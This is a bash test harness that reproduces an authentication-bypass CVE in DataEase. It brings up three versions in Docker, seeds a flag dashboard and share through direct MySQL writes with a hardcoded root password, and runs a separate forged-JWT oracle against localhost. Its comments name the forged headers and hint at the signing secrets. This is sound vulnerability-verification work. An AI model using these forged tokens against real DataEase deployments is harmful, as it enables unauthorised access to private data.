#!/usr/bin/env bash
# Reproducible gate for dataease-cve-2026-57172. Brings up ONE real DataEase
# profile at a time, seeds the ${PCB_FLAG} dashboard + a passwordless share,
# runs the forged-JWT oracle over external HTTP, prints the boolean.
#   ./gate.sh v0  -> original forged X-DE-TOKEN reaches flag @ 2.10.1
#   ./gate.sh v1  -> residual forged X-DE-LINK-TOKEN reaches flag @ 2.10.23 (+ original blocked)
#   ./gate.sh v2  -> residual forged X-DE-LINK-TOKEN blocked @ 2.10.24
set -u
PROJ=pcbde
PROF="${1:?usage: gate.sh v0|v1|v2}"
FLAG="${PCB_FLAG:-PCB_FLAG_de57172_a7f3c9e21b}"
RES=777000777
case "$PROF" in
  v0) PORT=18101; MY=${PROJ}-mysql_v0-1 ;;
  v1) PORT=18123; MY=${PROJ}-mysql_v1-1 ;;
  v2) PORT=18124; MY=${PROJ}-mysql_v2-1 ;;
  *) echo "bad profile"; exit 2 ;;
esac
cd "$(dirname "$0")"

docker compose -p "$PROJ" --profile "$PROF" up -d
echo "[*] waiting for DataEase $PROF on :$PORT ..."
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT}/de2api/login/localLogin" 2>/dev/null)
  [ "$code" != "000" ] && { echo "[*] up (HTTP $code)"; break; }
  sleep 10
done

DB(){ docker exec "$MY" mysql -uroot -pPassword123@mysql -e "$1" dataease 2>/dev/null; }
DB "DELETE FROM data_visualization_info WHERE id='$RES'; DELETE FROM xpack_share WHERE resource_id=$RES;"
DB "INSERT INTO data_visualization_info (id,name,pid,org_id,level,node_type,type,canvas_style_data,component_data,status,create_time,create_by,version,delete_flag) VALUES ('$RES','$FLAG','0','1',0,'canvas','dashboard','{}','[]',1,UNIX_TIMESTAMP()*1000,'1',3,0);"
DB "INSERT INTO xpack_share (id,creator,time,exp,uuid,pwd,resource_id,oid,type) VALUES (777001,1,UNIX_TIMESTAMP()*1000,0,'flaguuid00000001',NULL,$RES,1,0);"

echo "[*] residual probe (X-DE-LINK-TOKEN, link-pwd-fit2cloud):"
PCB_FLAG="$FLAG" python3 oracle.py "http://127.0.0.1:${PORT}" residual
echo "[*] original probe (X-DE-TOKEN, 83d923...):"
PCB_FLAG="$FLAG" python3 oracle.py "http://127.0.0.1:${PORT}" original
